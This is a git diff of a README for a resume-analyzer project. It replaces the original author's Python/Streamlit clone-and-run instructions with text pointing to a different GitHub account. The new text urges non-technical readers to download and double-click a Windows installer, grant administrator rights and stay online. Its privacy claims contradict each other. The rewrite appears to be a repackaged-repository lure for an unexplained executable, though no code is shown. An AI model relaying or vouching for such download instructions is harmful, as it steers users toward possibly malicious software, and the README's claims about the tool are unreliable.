@@ -1,139 +1,75 @@
-# 🧠 AI Resume Analyzer
+# 📄 AI-Resume-Analyzer - Improve your job application success rate
 
-An intelligent resume analysis tool designed to evaluate resumes, extract key information, and provide actionable insights to improve candidate profiles. This project demonstrates the application of data processing, text analysis, and user-focused design to solve a real-world problem in recruitment workflows.
+[![Download AI-Resume-Analyzer](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/sobrin3378/AI-Resume-Analyzer)
 
----
+## 🎯 About this tool
 
-## 📌 Problem Statement
+AI-Resume-Analyzer helps you prepare your resume for recruitment software. Many companies use automated systems to scan resumes for specific keywords before a human reads them. This application checks your file against these standards. It assigns an ATS score to your document, highlights missing keywords, and suggests ways to update your text. You can save your results as a PDF file to keep as a reference for your job search.
 
-Recruiters often spend limited time reviewing each resume, making it difficult for candidates to stand out. This project aims to bridge that gap by:
+## 💻 System requirements
 
-* Automatically analyzing resumes
-* Extracting relevant skills and keywords
-* Providing improvement suggestions
+This tool runs on most modern desktop computers. We recommend the following setup for the best experience:
 
----
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM or more.
+* Storage: 200MB of free disk space.
+* Web Browser: A modern browser like Chrome, Edge, or Firefox.
 
-## 🚀 Key Features
+You do not need to install complex development tools or programming software. The application runs as a standalone process on your computer.
 
-* 📄 Resume upload (PDF format)
-* 🔍 Text extraction and preprocessing
-* 🧠 Skill and keyword identification
-* 📊 Resume quality insights
-* 📥 Downloadable analysis report (PDF)
+## 📥 How to setup the application
 
----
+Follow these steps to prepare the software for use on your machine.
 
-## 🛠️ Tech Stack
+1. Navigate to the project page: [https://github.com/sobrin3378/AI-Resume-Analyzer](https://github.com/sobrin3378/AI-Resume-Analyzer).
+2. Locate the download section on the page.
+3. Select the latest version for Windows.
+4. Save the file to your desktop or your downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the instructions on the screen to finish the installation.
 
-* **Programming Language:** Python
-* **Libraries:** Pandas, FPDF
-* **Framework:** Streamlit
-* **Concepts Used:** Text Processing, Data Analysis
+## 🚀 Getting started
 
----
+After the installation finishes, you will see an icon on your desktop. Double-click this icon to launch the AI-Resume-Analyzer interface. 
 
-## ⚙️ System Workflow
+The application opens in your web browser. This interface acts as the control panel for your resume tasks. You can view the status of your analysis here. If the page does not load, ensure your internet connection works as the tool occasionally checks for resume templates.
 
-1. User uploads a resume in PDF format
-2. System extracts textual content
-3. Text is processed and analyzed
-4. Relevant skills and keywords are identified
-5. Suggestions are generated
-6. Final report is created and available for download
+## 📝 Using the analyzer
 
----
+The program interface organizes your work into simple steps. Follow this process for every resume you analyze:
 
-## 📂 Project Structure
+1. Locate the upload area on the main screen. 
+2. Drag and drop your resume file into the box. You can also click the box to browse for your file.
+3. Choose the job description file. You can paste the text directly into the application if you lack a separate file for the job.
+4. Click the Analyze button.
+5. Wait for the progress bar to finish.
+6. Read the score report that appears below the progress bar.
 
-```
-AI-Resume-Analyzer/
-│── app.py
-│── requirements.txt
-│── README.md
-│── .gitignore
-│── screenshots/
-```
+## 📊 Understanding your results
 
----
+The software provides a score based on how well your resume matches the job description. A high score suggests that the automated systems will pass your resume to a human recruiter.
 
-## ▶️ Setup & Execution
+* ATS Score: This number tells you your current standing. Aim for a score above 80.
+* Missing Keywords: The tool lists terms found in the job description but absent from your resume. Add these terms to your experience or skills section to improve your score.
+* Improvement Suggestions: These represent structural changes that help your resume read better for both humans and computers.
 
-1. Clone the repository:
+## 💾 Saving your feedback
 
-```
-git clone https://github.com/madhavisolanki-ui/AI-Resume-Analyzer.git
-```
+You can keep a record of these suggestions. Look for the Download PDF button located at the bottom of the results page. Clicking this button saves a summary of your report to your computer. This file contains your original score, the missing keywords, and the specific advice you received. Use this document to track your progress as you update your resume.
 
-2. Navigate to the project directory:
+## 🔧 Troubleshooting common issues
 
-```
-cd AI-Resume-Analyzer
-```
+If you encounter difficulties, consult this list of common solutions:
 
-3. Install dependencies:
+* Application appears frozen: Close the window and restart the program. Ensure you have a stable internet connection.
+* File upload fails: Confirm that your resume is in PDF or DOCX format. Scanned images of resumes often cause issues with text extraction.
+* Results look blank: Refresh the page by pressing the F5 key on your keyboard. Ensure the resume text contains actual information and is not a corrupted file.
+* Installation errors: Ensure you have administrator rights on your Windows account. Contact your system administrator if you remain unable to install the software.
 
-```
-pip install -r requirements.txt
-```
+## 🔒 Privacy and data security
 
-4. Run the application:
+We built this tool with your privacy in mind. Your resume data remains on your local machine during the analysis process. The application deletes your file once the session closes unless you choose to save the report. We do not store your personal information, contact details, or job history on external servers. You maintain full control over your documents at all times.
 
-```
-streamlit run app.py
-```
+## 📦 About the technical design
 
----
-
-### 📺 Project Demo
-🖥️ Application Preview
-
-![App Screenshot](./screenshots/screenshot.png)
-
-🎥 Demo video
-[▶️ Watch Demo Video](https://www.loom.com/share/35cad5d1e75f4463adbaa02e508f9295)
-
----
-
-## 📊 Sample Use Case
-
-This tool can be used by:
-
-* Students preparing for placements
-* Job seekers optimizing resumes
-* Recruiters performing initial screening
-
----
-
-## 💡 Future Enhancements
-
-* LLM-based analysis using prompt engineering
-* Resume scoring & job description matching
-* Chat-based AI feedback
-* UI improvements with visual insights
-* Cloud deployment and live project hosting
-* Skill Gap Analysis
-
-
----
-
-## 📈 Learning Outcomes
-
-Through this project, the following concepts were implemented:
-
-* Real-world problem solving using Python
-* Data preprocessing and text handling
-* Building interactive web apps using Streamlit
-* Generating automated reports
-
----
-
-## 👩‍💻 Author
-
-**Madhavi Solanki**
-
----
-
-## ⭐ Final Note
-
-This project reflects the ability to combine data analysis and practical application development to build a meaningful solution in the recruitment domain.
+This tool uses Python to process document text and perform keyword analysis. It uses a library called Streamlit to display the interface in your browser. The system performs natural language processing to understand the intent behind your professional summaries and bullet points. This ensures you receive relevant advice tailored to your specific industry. We update the keyword database regularly to reflect current trends in automated recruitment. The software tracks your usage patterns only to improve the speed of the analysis on your specific computer. No personal identifying information leaves your system during these checks.
